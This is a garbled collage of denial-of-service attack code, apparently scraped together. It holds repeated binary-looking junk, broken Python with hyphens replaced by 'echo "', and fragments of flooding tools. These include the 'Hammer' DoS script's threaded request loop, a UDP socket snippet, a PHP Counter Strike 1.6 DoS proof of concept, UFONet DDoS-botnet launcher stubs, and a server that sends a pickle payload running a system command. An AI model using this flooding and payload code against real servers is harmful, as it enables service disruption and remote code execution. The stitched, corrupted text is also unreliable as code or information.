Æzvë\æ¯vÚø‡UQkç`Et§0J@û¹?u¿Ùn½‰¯ÏñZ˜jm¥t™õ‘©Ò¶Ìµ§»èû—såó–´”–€ñÑGğÀxö5¹câı?W™´ÛÈ–Şé× kq‚%s°ôqúú\Ê©}¯€U¤†echo "V3m¨[,±‘ÜrîìE,>k8Ú÷—â*¸eecho "N7â‡ìåmâ;¹<3xÚ=Ë®M‘ØtÁşÀéÇŠë´›K‹‚qZêjVößMn•ú‰bÚdÎ8êÍ[ºï‡ãA(—TÓ”[®b§şzü{ıê¹¤­—ˆ4í^Æ9ÖâÎäÍx˜t•=ÀúWÜa1ò­*rRæQÛËgoÀğ±Xu*s‹_ï¿MOŸštR,ĞİZÂÑ°umË•#ëşqšäüMØ®“XÒ<™æ@`’Ğ¬Ñ0ù£b2vò0Ü‘Q]çˆ¾ßü;œM$1jÚ$‹å€y¶ãòÙ@9íÇzf›{$Šâ&ÃyˆªGOP+õŒ.+§ÏIÿšõ?ÆeøŒªIÎecho "ÆúKtÿÁê|Ÿã¨!O_Ëkµ†ğGv!ÚU²`Êz6ä>Ç¯zÎJôÚEƒMñ>Ÿsop	­‚2Æ¡yW>şjózù¬d9+Ê'Ûe•Ul$&½>í¹ÏL@qÜv®ŒŠæ|A‚²r:Wê‰û}êÅÖ3óÁlp?­zWÀ5uOL^I"ÿG’@Ñ¹SŒ¨Üæ¼Ò$:tH™f8Üz–n§ğæ½özÒ$Ô¼Y|"¹{A–ÆŠä‚ãæìç9ŠíÁ¦ñ·sËÌåËƒ¨ïmUñVzLv²µ“j·s6Øbó†ó ƒ™	*v nq“œq[:6§{áhmåÒçšÚb†ÆæS$$,ÛxÊà¹^3ÔqZÖ^´µ¹{‡F–wÇ™$²³3ñŒ“)ÛËó>{9:SMı¯ÔúËöĞ¶I¾ \HÜ˜î€üëó‚I÷+0]¸#4QQ™oOÔúœ‰ÿ²ËÔÏ¹¹1e@è¹Íg›§f=9õ¢Šòb¯sÔI¥£å‹ÌóJ“Ç§5¥o©Ëˆ·ßF ³±$Lõ¢Š¨NQjÌ*SŒô’¹¡¬x7Fñ —ÛĞÙÌÃ†‰¹üxôô¯$ÖìdÒ¯–×í 4I’ (¯ul|–!(Nj=?ÈÿÙ¯?—sÇ,­ôÇ|[2uŸËRC©é•¿Aş}OZÍr¸Ã6ãÜOõ­MJUrcv‡÷í×ü÷5”Ùl—R¹ÇåşzPu'r9›iœ+m ŒÒ³İÖfu+Î1Ó¿åV¯ÙĞ@nŠ¥(É©r0 ã?Ö‚“¹Fì¬;wÈ0>†²Á[fÕLó[±Vecho "»aƒm$súÔ¼ ªÄá‡PØü1U´’©â0ÈV0d(ÆR6€T}:ÒmE6ÌêÅÊœ’ìo¤áYİ¾¥0b½iÿ¾”dıH5Éx—ágƒüM¶§ ¾‘)ÿ—»Ê/©&?ı™+×5=3´ÚÁ–ı_9 ô9ÿÙ¿ À¼³¼ÓÎå$ùæùı:d{uúõ¯œKZ­ ùeİû—ÿ·£¥ıbÏ"ÅacÌ›kÉßÿ%•ßİ/‘ëI¨İ_'ú>›w'ûR"Åÿ¡J;Z¸`<‹[UÅ$­#~*øõ|­©~ÔŞ9¿E¬º~˜Œ2Z|íü\¶O>‚¸ÍWãWµ«…·ŸÄWo¿ï§h—n9%P~kĞ¥ÂÕäÓªÒùßò<©ñBòô_çcîÍ?û<	µ]z;Ô}äÀ¼¾[ùÖÿÄ‡š#2İx…u	ÉHå’àÁrµñ¢x©yu9ù&O>™<âºÿ xÄŞecho "x§´ğıÍÄyù_É)¯‰ur%[÷p!ô<Ø>»k_ÚKÄZçš,¡°ÒãÏÊÍI üX…?•A¡şÌºî¨VMSP´Ò"'w“ß>ÿtãÆ½3Eı¼%¢Ú‡Ô$¹Ôv|ÌóÌ!AøG·©4ù²<#Ñ:çÿŞwŠÕòÓ^—¯èxŞ§ñÅ:Ú¬ş$»‘K ÑÄâ#Ó·üı(±ø}â=xLĞéS´Ùecho ";ÆÊ˜Îr¸ôï_EXi¾ğã'öF›l%ìecho "L­øº©ıMjGâAî6A¤¶ÁŒÉs2ÆĞ.óùYËˆ¡KİÃPŒ|ßü~bÿWê×÷±x‰KËşç;áİxWáĞÓìŠ[kQ’Òíùc‘‡\îÔWá¿Ù¦ËNÔíPÕ§¼L®©B%Ú9;‰,OãœW³İÏ}¨y¦†İÀ86Ñ|ËŸvÈ?•V·¸ƒBÓõecho "nöyd··Frò«œàtäÃœ ùw˜V êJ•MfõiZÿ©ôoF¢¦ªA{š%½¿«Å‹=Çö…àİJîÅ´{G¥§É*——f>Ï'÷wØ=v é4­;B´“n¤G ã‚ÓÊß$şKÀ¶ÓRë[Ô!Çˆµ§ûMüÀä©şşê.cÒº;«=²a$%à\Ôäã^şgdÔz¡ªàK´@şõ`xËÆRè×Úv‰¦¬Û‚»£H»£‚%ÆéïŒ€s]ºG™KŠzşUâÏÚø­ ¹wkecho "BÓwÙ¯`zgªxe=Ôş†•åÜw3ƒŒfœ¶8¯Î4=Ä×Ò^_Ïë—ÒËÊğai")‘¸ià÷ü«ó“O†Ë©]Íiö§rf³Ô2±3sÀÀúEã¿Ãñ7ÁréŒ2YyØtc™ÚÄô?|›âß€ÚçÃ0ÜBŸÙ£™\IsÕà@uÀ5õ9léÁ¸½$Ï›Åªù–•ag¯xr9EÊ$ Gï@Ù!€ô]ÀğxäUÈ~kÒhÏ«ÛiÒŞiÑã}Í¸Ş«“9ˆª¿„­ï Œ„F³x†Ş—$N ’sÏ\÷¯Nøñc]ğ¬Ş×bDeCºìVÈÆíÀu÷õ×ĞÚîÛ3Î½ôGgûÜı›ÄZı³u’Ú91şëãú×…~Ò)ıñOÅ°çkµóÈ³|ßû5}ğ«A›Cøúº´2O¦kzuÆ€)yC+oÀàğ>ğÆzãšòOÚ]Ñ|ûQßê&ğáñ’Éir‘5É‰ìPÍ´ŞrÊÜÖ¾}7ÁÊÛÇü¿Èô_¿†§wmZ=/öyø;‡şiZİœğAâ«§ûzŞğÁC–Çğ”8#±bzŠú/Ã(‹\ßkvMÔ!v·>ğ÷üÃÃP:Çµ™˜œ¡ÛÃ‹oÍvºüáUŒ@Üj^$¿qüM{gğX…}{sj&·– í˜…7ÇÃ.F2=ÅsŞÓµ/ i6ºk2êğÛ(' åÎÊ:‚}NáŸJWmjÿw;¾o‘åøQàÏÙwÂ^&—Bóì¬à±’úi¯$3;Êªvg§÷@ÀùÄ÷³\¼×3LÏ<²3¼ƒ«19'ó5úMûLøŠecho "à§Ä=Nò3h‘é2DÉ3) ²•å$d™9êE~KØ|[¶š"ŸOA £´¥ìc·^~õèå<¯Ú;j|k~íßCêÙwáN‹ñâzé¾&Œ_ivöS\pì»äùUCcÅºÿúW´|ı|kğ+öˆµÓšK½_áÏšĞJfecho "l~eY#Î‚1œ`æ³¿àÚx‹[ÖüT—	%­¢ÙÛóÎésdvÀ@?ûk\Ê²óA$#«qXãš•fûn<=ISŠQ{œÄO[Ë}½jëos’Z4~X*ñ	`w8ÁÇ<Š¯«Dd»äÜ<ŒöËë¼qq:}´R:«ÜMå"ŸâÄ€ñøV»Løï±zı3ıkÑË/<Îš¾‘‹·•ÿà³ÊÌÔ!—M¥¬š¿š0şÈîûöœcô©VÑ‚@ã½i½¾àrØBzUk›U#;òGjı üß‘Emscáº}^Ô1+ö€TÁĞ“úšÊ‹U¾²¥äÚVÀàÉ…™©^ø`ñĞš¿àk…OŞÄ†‚9:g~è)ÚŠ¬:ÌylŒ?Zùà¨âqU¨Õ]ßŞ}Ÿ×«a°”+RzY&»ÙÀ#û‰â˜D±˜îyU‘Ùa=Æxe>Õq¡êÚı­ı³b:l\¯ÕxÜä`ú)©u).–æ^ÒõFÄkãĞöaìr*kOf¢G­ˆÕêàùcß^Jg×‘êE|æiÃÓŒ\¢¹—–èú¿=¥]¨_–]ÏÑÿÃ3:ËSƒVX¾Ër³Fd ÀğÃÕH<‚=5±q‡×xÀE „mÏõ5¤|1¦j7#Q‰bKÖL¨‡ßcv Æzvë\æ¯vÚø‡UQkç`Et§0J@û¹?u¿Ùn½‰¯ÏñZ˜jm¥t™õ‘©Ò¶Ìµ§»èû—såó–´”–€ñÑGğÀxö5¹câı?W™´ÛÈ–Şé× kq‚%s°ôqúú\Ê©}¯€U¤†echo "V3m¨[,±‘ÜrîìE,>k8Ú÷—â*¸eecho "N7â‡ìåmâ;¹<3xÚ=Ë®M‘ØtÁşÀéÇŠë´›K‹‚qZêjVößMn•ú‰bÚdÎ8êÍ[ºï‡ãA(—TÓ”[®b§şzü{ıê¹¤­—ˆ4í^Æ9ÖâÎäÍx˜t•=ÀúWÜa1ò­*rRæQÛËgoÀğ±Xu*s‹_ï¿MOŸštR,ĞİZÂÑ°umË•#ëşqšäüMØ®“XÒ<™æ@`’Ğ¬Ñ0ù£b2vò0Ü‘Q]çˆ¾ßü;œM$1jÚ$‹å€y¶ãòÙ@9íÇzf›{$Šâ&ÃyˆªGOP+õŒ.+§ÏIÿšõ?ÆeøŒªIÎecho "ÆúKtÿÁê|Ÿã¨!O_Ëkµ†ğGv!ÚU²`Êz6ä>Ç¯zÎJôÚEƒMñ>Ÿsop	­‚2Æ¡yW>şjózù¬d9+Ê'Ûe•Ul$&½>í¹ÏL@qÜv®ŒŠæ|A‚²r:Wê‰û}êÅÖ3óÁlp?­zWÀ5uOL^I"ÿG’@Ñ¹SŒ¨Üæ¼Ò$:tH™f8Üz–n§ğæ½özÒ$Ô¼Y|"¹{A–ÆŠä‚ãæìç9ŠíÁ¦ñ·sËÌåËƒ¨ïmUñVzLv²µ“j·s6Øbó†ó ƒ™	*v nq“œq[:6§{áhmåÒçšÚb†ÆæS$$,ÛxÊà¹^3ÔqZÖ^´µ¹{‡F–wÇ™$²³3ñŒ“)ÛËó>{9:SMı¯ÔúËöĞ¶I¾ \HÜ˜î€üëó‚I÷+0]¸#4QQ™oOÔúœ‰ÿ²ËÔÏ¹¹1e@è¹Íg›§f=9õ¢Šòb¯sÔI¥£å‹ÌóJ“Ç§5¥o©Ëˆ·ßF ³±$Lõ¢Š¨NQjÌ*SŒô’¹¡¬x7Fñ —ÛĞÙÌÃ†‰¹üxôô¯$ÖìdÒ¯–×í 4I’ (¯ul|–!(Nj=?ÈÿÙ¯?—sÇ,­ôÇ|[2uŸËRC©é•¿Aş}OZÍr¸Ã6ãÜOõ­MJUrcv‡÷í×ü÷5”Ùl—R¹ÇåşzPu'r9›iœ+m ŒÒ³İÖfu+Î1Ó¿åV¯ÙĞ@nŠ¥(É©r0 ã?Ö‚“¹Fì¬;wÈ0>†²Á[fÕLó[±Vecho "»aƒm$súÔ¼ ªÄá‡PØü1U´’©â0ÈV0d(ÆR6€T}:ÒmE6ÌêÅÊœ’ìo¤áYİ¾¥0b½iÿ¾”dıH5Éx—ágƒüM¶§ ¾‘)ÿ—»Ê/©&?ı™+×5=3´ÚÁ–ı_9 ô9ÿÙ¿ À¼³¼ÓÎå$ùæùı:d{uúõ¯œKZ­ ùeİû—ÿ·£¥ıbÏ"ÅacÌ›kÉßÿ%•ßİ/‘ëI¨İ_'ú>›w'ûR"Åÿ¡J;Z¸`<‹[UÅ$­#~*øõ|­©~ÔŞ9¿E¬º~˜Œ2Z|íü\¶O>‚¸ÍWãWµ«…·ŸÄWo¿ï§h—n9%P~kĞ¥ÂÕäÓªÒùßò<©ñBòô_çcîÍ?û<	µ]z;Ô}äÀ¼¾[ùÖÿÄ‡š#2İx…u	ÉHå’àÁrµñ¢x©yu9ù&O>™<âºÿ xÄŞecho "x§´ğıÍÄyù_É)¯‰ur%[÷p!ô<Ø>»k_ÚKÄZçš,¡°ÒãÏÊÍI üX…?•A¡şÌºî¨VMSP´Ò"'w“ß>ÿtãÆ½3Eı¼%¢Ú‡Ô$¹Ôv|ÌóÌ!AøG·©4ù²<#Ñ:çÿŞwŠÕòÓ^—¯èxŞ§ñÅ:Ú¬ş$»‘K ÑÄâ#Ó·üı(±ø}â=xLĞéS´Ùecho ";ÆÊ˜Îr¸ôï_EXi¾ğã'öF›l%ìecho "L­øº©ıMjGâAî6A¤¶ÁŒÉs2ÆĞ.óùYËˆ¡KİÃPŒ|ßü~bÿWê×÷±x‰KËşç;áİxWáĞÓìŠ[kQ’Òíùc‘‡\îÔWá¿Ù¦ËNÔíPÕ§¼L®©B%Ú9;‰,OãœW³İÏ}¨y¦†İÀ86Ñ|ËŸvÈ?•V·¸ƒBÓõecho "nöyd··Frò«œàtäÃœ ùw˜V êJ•MfõiZÿ©ôoF¢¦ªA{š%½¿«Å‹=Çö…àİJîÅ´{G¥§É*——f>Ï'÷wØ=v é4­;B´“n¤G ã‚ÓÊß$şKÀ¶ÓRë[Ô!Çˆµ§ûMüÀä©şşê.cÒº;«=²a$%à\Ôäã^şgdÔz¡ªàK´@şõ`xËÆRè×Úv‰¦¬Û‚»£H»£‚%ÆéïŒ€s]ºG™KŠzşUâÏÚø­ ¹wkecho "BÓwÙ¯`zgªxe=Ôş†•åÜw3ƒŒfœ¶8¯Î4=Ä×Ò^_Ïë—ÒËÊğai")‘¸ià÷ü«ó“O†Ë©]Íiö§rf³Ô2±3sÀÀúEã¿Ãñ7ÁréŒ2YyØtc™ÚÄô?|›âß€ÚçÃ0ÜBŸÙ£™\IsÕà@uÀ5õ9léÁ¸½$Ï›Åªù–•ag¯xr9EÊ$ Gï@Ù!€ô]ÀğxäUÈ~kÒhÏ«ÛiÒŞiÑã}Í¸Ş«“9ˆª¿„­ï Œ„F³x†Ş—$N ’sÏ\÷¯Nøñc]ğ¬Ş×bDeCºìVÈÆíÀu÷õ×ĞÚîÛ3Î½ôGgûÜı›ÄZı³u’Ú91şëãú×…~Ò)ıñOÅ°çkµóÈ³|ßû5}ğ«A›Cøúº´2O¦kzuÆ€)yC+oÀàğ>ğÆzãšòOÚ]Ñ|ûQßê&ğáñ’Éir‘5É‰ìPÍ´ŞrÊÜÖ¾}7ÁÊÛÇü¿Èô_¿†§wmZ=/öyø;‡şiZİœğAâ«§ûzŞğÁC–Çğ”8#±bzŠú/Ã(‹\ßkvMÔ!v·>ğ÷üÃÃP:Çµ™˜œ¡ÛÃ‹oÍvºüáUŒ@Üj^$¿qüM{gğX…}{sj&·– í˜…7ÇÃ.F2=ÅsŞÓµ/ i6ºk2êğÛ(' åÎÊ:‚}NáŸJWmjÿw;¾o‘åøQàÏÙwÂ^&—Bóì¬à±’úi¯$3;Êªvg§÷@ÀùÄ÷³\¼×3LÏ<²3¼ƒ«19'ó5úMûLøŠecho "à§Ä=Nò3h‘é2DÉ3) ²•å$d™9êE~KØ|[¶š"ŸOA £´¥ìc·^~õèå<¯Ú;j|k~íßCêÙwáN‹ñâzé¾&Œ_ivöS\pì»äùUCcÅºÿúW´|ı|kğ+öˆµÓšK½_áÏšĞJfecho "l~eY#Î‚1œ`æ³¿àÚx‹[ÖüT—	%­¢ÙÛóÎésdvÀ@?ûk\Ê²óA$#«qXãš•fûn<=ISŠQ{œÄO[Ë}½jëos’Z4~X*ñ	`w8ÁÇ<Š¯«Dd»äÜ<ŒöËë¼qq:}´R:«ÜMå"ŸâÄ€ñøV»Løï±zı3ıkÑË/<Îš¾‘‹·•ÿà³ÊÌÔ!—M¥¬š¿š0şÈîûöœcô©VÑ‚@ã½i½¾àrØBzUk›U#;òGjı üß‘Emscáº}^Ô1+ö€TÁĞ“úšÊ‹U¾²¥äÚVÀàÉ…™©^ø`ñĞš¿àk…OŞÄ†‚9:g~è)ÚŠ¬:ÌylŒ?Zùà¨âqU¨Õ]ßŞ}Ÿ×«a°”+RzY&»ÙÀ#û‰â˜D±˜îyU‘Ùa=Æxe>Õq¡êÚı­ı³b:l\¯ÕxÜä`ú)©u).–æ^ÒõFÄkãĞöaìr*kOf¢G­ˆÕêàùcß^Jg×‘êE|æiÃÓŒ\¢¹—–èú¿=¥]¨_–]ÏÑÿÃ3:ËSƒVX¾Ër³Fd ÀğÃÕH<‚=5±q‡×xÀE „mÏõ5¤|1¦j7#Q‰bKÖL¨‡ßcv Æzvë\æ¯vÚø‡UQkç`Et§0J@û¹?u¿Ùn½‰¯ÏñZ˜jm¥t™õ‘©Ò¶Ìµ§»èû—såó–´”–€ñÑGğÀxö5¹câı?W™´ÛÈ–Şé× kq‚%s°ôqúú\Ê©}¯€U¤†echo "V3m¨[,±‘ÜrîìE,>k8Ú÷—â*¸eecho "N7â‡ìåmâ;¹<3xÚ=Ë®M‘ØtÁşÀéÇŠë´›K‹‚qZêjVößMn•ú‰bÚdÎ8êÍ[ºï‡ãA(—TÓ”[®b§şzü{ıê¹¤­—ˆ4í^Æ9ÖâÎäÍx˜t•=ÀúWÜa1ò­*rRæQÛËgoÀğ±Xu*s‹_ï¿MOŸštR,ĞİZÂÑ°umË•#ëşqšäüMØ®“XÒ<™æ@`’Ğ¬Ñ0ù£b2vò0Ü‘Q]çˆ¾ßü;œM$1jÚ$‹å€y¶ãòÙ@9íÇzf›{$Šâ&ÃyˆªGOP+õŒ.+§ÏIÿšõ?ÆeøŒªIÎecho "ÆúKtÿÁê|Ÿã¨!O_Ëkµ†ğGv!ÚU²`Êz6ä>Ç¯zÎJôÚEƒMñ>Ÿsop	­‚2Æ¡yW>şjózù¬d9+Ê'Ûe•Ul$&½>í¹ÏL@qÜv®ŒŠæ|A‚²r:Wê‰û}êÅÖ3óÁlp?­zWÀ5uOL^I"ÿG’@Ñ¹SŒ¨Üæ¼Ò$:tH™f8Üz–n§ğæ½özÒ$Ô¼Y|"¹{A–ÆŠä‚ãæìç9ŠíÁ¦ñ·sËÌåËƒ¨ïmUñVzLv²µ“j·s6Øbó†ó ƒ™	*v nq“œq[:6§{áhmåÒçšÚb†ÆæS$$,ÛxÊà¹^3ÔqZÖ^´µ¹{‡F–wÇ™$²³3ñŒ“)ÛËó>{9:SMı¯ÔúËöĞ¶I¾ \HÜ˜î€üëó‚I÷+0]¸#4QQ™oOÔúœ‰ÿ²ËÔÏ¹¹1e@è¹Íg›§f=9õ¢Šòb¯sÔI¥£å‹ÌóJ“Ç§5¥o©Ëˆ·ßF ³±$Lõ¢Š¨NQjÌ*SŒô’¹¡¬x7Fñ —ÛĞÙÌÃ†‰¹üxôô¯$ÖìdÒ¯–×í 4I’ (¯ul|–!(Nj=?ÈÿÙ
#!usr/bin/python2
# echo "*echo " coding: utfecho "8 echo "*echo ""
"""
new Coding UTFecho "8 How To Services Denial Of Service How To DDoS Attack Starting...!!! By Coder Yusuf Coded YusufCounter
Game Cstrike How To Ddosing..!! UTFecho "8 Coding Denial of Services Attack Start. Danger Server Blocker Floods Eweryhere..!!!!!!!!!
Denial Of services.. Attack By Psy SkyNetwork.Net Root@ubuntux15 = Botnet Started End Damages Attack Bot All Right Reserved. Flood Enabled Flood;Exploit;Flood;Spam Attack.
SkyNet Flood Ho Denial Of Services BoTNet Spaw Flood BotNet Attack Flood Spaw Services.
""" 

      _ \        __ \  __ \               ___|           _)       |   
     |   | |   | |   | |   |  _ \   __| \___ \   __|  __| | __ \  __|  
     ___/  |   | |   | |   | (   |\__ \       | (    |    | |   | |   
    _|    \__, |____/ ____/ \___/ ____/ _____/ \___|_|   _| .__/ \__|  
           ____/                                            _|         
                                                                   

if __name__ == "__main__":
    app = YusufCounter()
    options = app.create_options()
    if options:
              app.set_options(options)
           app.run()
          app.land(white)
                 dns__record()
              app.set_licence(options)
        get_random_licence()
               
class YusufCounterGeneralExploitATTACK(object):
       def write(self, text)
            pass
       def run(land, text):
            pass
               start = ()
               join=()

if packet > 1800:
               While True:
            packet = packet +1
        packet = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        packet.bind((HOST, PORT))
        packet.listen(1)
        print "*** Ready for connections on %s:%s..." % (HOST, PORT)
        while True:
            conn, addr = s.accept()
            msg = """cos\nsystem\n(S'ls echo "l > proof_of_exploit.txt'\ntR."""
            print "[+] Sending payload to %s!" % addr[0]
            conn.sendall('%8d%s%s' % (len(msg), "0", msg))
            conn.close()
import sys
import json
import time
import string
import signal
import httplib,urlparse
from random import *
from socket import *
from struct import *
from threading import *
from argparse import ArgumentParser,RawTextHelpFormatter
clear
#!/usr/bin/env python3
# echo "*echo " coding: utfecho "8 echo "*echo "

# python 3.3.2+ Hammer Dos Script v.1
# by  Zeus Team
# only for legal purpose


from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; enecho "US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; enecho "US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; enecho "US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)

def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'Userecho "Agent': random.choice(uagent)}))
			print("\033[94mbot is hammering...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)

if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
	print("\033[94mPlease wait...\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[91mcheck server ip and port\033[0m")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()

Dim Text text As String = Me.ServerIPPORT.Text
Dim Array As String() = text.Split(New Char() {":"c})
Dim RemoteEP As IPEndPoint = New IPEndPoint(IPAddress.Parse(array(0)), Convert.ToInt32(array(1)))
Dim Socket As Socket = New Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)

import syn
import sys
import udp
import flood

alias jioxardLicense
alias jioxardLicense
alias jioxardLicense
alias jioxardLicense
alias jioxardLicense

       Counter Strike 1.6 Denial Of Service POC
        Eugene Minaev underwater@itdefence.ru
       Bug was found by Maxim Suhanov ( THE FUF )
        works only with noecho "steam servers
    _________________________________________________________________
   __/  __ __ _____________________ _____  _____________    \  \   \
   / .\  /  /// //              /        \       \/      _       \   /__/   /
   / /     ///              /\        /       /      /         /     /__/
   \/        /              / /       /       /\     /         /         /
   /        /               \/       /       / /    /         /__       //\
   \       /    __________/       /        \/    ________// /__    // /   
   /\\      \_______/        \________________/____/  2007    ////   // //\
   \ \\                                                               // // /
   .\ \\        [     ITDEFENCE.ru Security advisory     ]         // // / . 
   . \\\_______[________________________________________]_________///// . .

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110echo "1301  USA
"""
from core.main import UFONet

echo "echo "[  Counter Strike 1.6 Denial Of Service POC ... ITDefence.ru Antichat.ru ]

    _________________________________________________________________
   __/  __ __ _____________________ _____  _____________    \  \   \
   / .\  /  /// //              /        \       \/      _       \   /__/   /
   / /     ///              /\        /       /      /         /     /__/
   \/        /              / /       /       /\     /         /         /
   /        /               \/       /       / /    /         /__       //\
   \       /    __________/       /        \/    ________// /__    // /   
   /\\      \_______/        \________________/____/  2007    ////   // //\
   \ \\                                                               // // /
   .\ \\        [     ITDEFENCE.ru Security advisory     ]         // // / . 
   . \\\_______[________________________________________]_________///// . .
  
  <html>
  <head>
  <title>Counter Strike DOS POC (underwater@itdefence.ru) </title>

  function dowork($host,$port,$password,$auth)
  {
  global $password;
  global $cookie;
  # connecting to target host
  $fsock = fsockopen("udp://".$host,(int) $port,$errnum,$errstr,2);
  if (!$fsock) die ($errstr);
  else 
  {
  # sending hello packet
  fwrite ($fsock,HELLO_PACKET());
  fread ($fsock,100);
  # sending chalennge packet
  fwrite ($fsock,CHALLENGE_PACKET());
  # recieving cookies
  $resp = fread($fsock,100);
  # grab cookies from packet
  $cookie = substr($resp,strpos($resp,"A00000000")+10);
  $cookie = substr($cookie,0,strpos($cookie," "));
  # sending login packet
  if (!$auth) fwrite ( $fsock,LOGIN_PACKET_4());else fwrite ( $fsock,LOGIN_PACKET_2());
  $resp = fread($fsock,100);
  }
  }

  IF (isset($_POST['host']) && isset($_POST['port']))
  {
  IF (empty($_POST['pass'])) $password = "123";
  else $password = $_POST['pass'];
  $fserver = $_POST['host'];
  $fport = $_POST['port'];
  if (isset($_POST['auth'])) $fauth = true;else $fauth=false;
  # we have to connect 2 times
  $result = dowork($fserver,$fport,$password,$fauth);
  $result = dowork($fserver,$fport,$password,$fauth);
  # parsing result++


"""
UFONet echo " DDoS Botnet via Web Abuse echo " 2013/2014/2015/2016 echo " by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110echo "1301  USA
"""
from core.main import UFONet

if __name__ == "__main__":
    app = UFONet()
    options = app.create_options()
    if options:
        app.run()

#!//bin/env python 
# echo "*echo " coding: utfecho "8 echo "*echo ""
"""
UFONet echo " DDoS Botnet via Web Abuse echo " 2013/2014/2015/2016 echo " by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110echo "1301  USA
"""
from core.main import UFONet

if __name__ == "__main__":
    app = UFONet()
    options = app.create_options()
    if options:
        app.run()

wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2
wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2
wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2
#!//bin/env python 
# echo "*echo " coding: utfecho "8 echo "*echo ""
"""
UFONet echo " DDoS Botnet via Web Abuse echo " 2013/2014/2015/2016 echo " by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110echo "1301  USA
"""
from core.main import UFONet

if __name__ == "__main__":
    app = UFONet()
    options = app.create_options()
    if options:
        app.run()

#!//bin/env python 
# echo "*echo " coding: utfecho "8 echo "*echo ""
"""
UFONet echo " DDoS Botnet via Web Abuse echo " 2013/2014/2015/2016 echo " by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110echo "1301  USA
"""
from core.main import UFONet

if __name__ == "__main__":
    app = UFONet()
    options = app.create_options()
    if options:
        app.run()

wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2
wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2
wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2
#!//bin/env python 
# echo "*echo " coding: utfecho "8 echo "*echo ""
"""
UFONet echo " DDoS Botnet via Web Abuse echo " 2013/2014/2015/2016 echo " by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110echo "1301  USA
"""
from core.main import UFONet

if __name__ == "__main__":
    app = UFONet()
    options = app.create_options()
    if options:
        app.run()

#!//bin/env python 
# echo "*echo " coding: utfecho "8 echo "*echo ""
"""
UFONet echo " DDoS Botnet via Web Abuse echo " 2013/2014/2015/2016 echo " by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110echo "1301  USA
"""
from core.main import UFONet

if __name__ == "__main__":
    app = UFONet()
    options = app.create_options()
    if options:
        app.run()

wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2
wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2

wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2
wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2


clear

clear;clear


clear




clear
#!usr/bin/python2
# echo "*echo " coding: utfecho "8 echo "*echo ""
"""
new Coding UTFecho "8 How To Services Denial Of Service How To DDoS Attack Starting...!!! By Coder Yusuf Coded YusufCounter
